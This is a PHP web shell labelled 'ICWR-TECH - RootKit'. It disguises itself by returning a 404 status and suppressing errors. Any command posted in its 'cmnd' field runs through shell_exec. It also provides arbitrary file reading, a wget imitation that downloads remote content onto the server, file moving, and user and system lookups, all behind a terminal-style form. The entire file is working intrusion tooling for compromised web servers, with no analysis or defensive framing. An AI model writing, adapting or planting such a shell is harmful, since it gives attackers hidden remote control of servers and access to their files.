<?php
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
http_response_code(404);
function user() {
echo get_current_user();
}
function cat() {
$f = explode(" ",$_POST['cmnd']);
$file = $f[1];
echo htmlentities(file_get_contents($file));
}
function exe() {
if($result = shell_exec($_POST['cmnd'])) {
echo htmlentities($result);
} else {
if($_POST['cmnd'] == "pwd") {
echo getcwd();
}
if(isset($_POST['cmnd'])) {
$wget1 = explode("/", $_POST['cmnd']);
$fw = explode(" ",$_POST['cmnd']);
if($fw[0] == "wget") {
if(preg_match("/$fw[0]/", $_POST['cmnd'])) {
$i = 0;
foreach($wget1 as $wgets) {
$jumlah = $i++;
}
$fwget1 = fopen($wget1[$jumlah], "w");
fwrite($fwget1, file_get_contents($fw[1]));
fclose($fwget1);
if($fw[1] == "-LO") {
$fwget2 = fopen($fw[2], "w");
fwrite($fwget2, file_get_contents($fw[3]));
fclose($fwget2);
}
}
}
}
if(isset($_POST['cmnd'])) {
$fmv = explode(" ",$_POST['cmnd']);
if($fmv[0] == "mv") {
if(preg_match("/$fmv[0]/", $_POST['cmnd'])) {
copy($fmv[1], $fmv[2]);
if(unlink($fmv[1])) { } else { echo "Permission Denied"; }
}
}
}
if($_POST['cmnd'] == "id") {
$uid = @posix_getpwuid(posix_geteuid());
$gid = @posix_getgrgid(posix_getegid());
$usid = $uid['name'];
$uid = $uid['uid'];
$grid = $gid['name'];
$gid = $gid['gid'];
echo "uid=".$uid."(".$usid.") gid=".$gid."(".$grid.")"." groups=".$gid."(".$grid.")";
}
function lsdir() {
if($cntrl = opendir(getcwd())) {
while(false !==($entry = readdir($cntrl))) {
    if($entry != "." && $entry != "..") {
        echo $entry."<br>";
    }
}
closedir($cntrl);
}
}
if($_POST['cmnd'] == "ls") {
echo lsdir();
}
if($_POST['cmnd'] == "uname -a") {
echo php_uname();
}
if(isset($_POST['cmnd'])) {
$fcat = explode(" ",$_POST['cmnd']);
if($fcat[0] == "cat") {
if(preg_match("/$fcat[0]/", $_POST['cmnd'])) {
echo cat();
}
}
}
}
}
function term() {
?>
<?php user(); ?>@<?php echo gethostname().":".getcwd()." $ "; ?>
<?php
}
?>
<title>ICWR-TECH - RootKit</title>
<style>
* {
background: black;
color: green;
}
textarea {
width: 100%;
height: 400px;
border: 1px solid transparent;
}
.kotak {
height: 400px;
padding: 20px;
border: 1px solid green;
}
input[type="text"]{
border: 0px solid transparent;
color: white;
background: transparent;
}
.res {
overflow: auto;
}
</style>
<?php if(isset($_POST['cmnd'])) { ?>
<div class="res">
<?php term(); echo $_POST['cmnd']; ?>
<br>
<pre>
<?php exe(); ?>
</div>
<?php } ?>
</pre>
<form enctype="multipart/form-data" method="post">
<?php term(); ?><input type="text" autofocus="autofocus" onfocus="this.select()" name="cmnd">
</form>
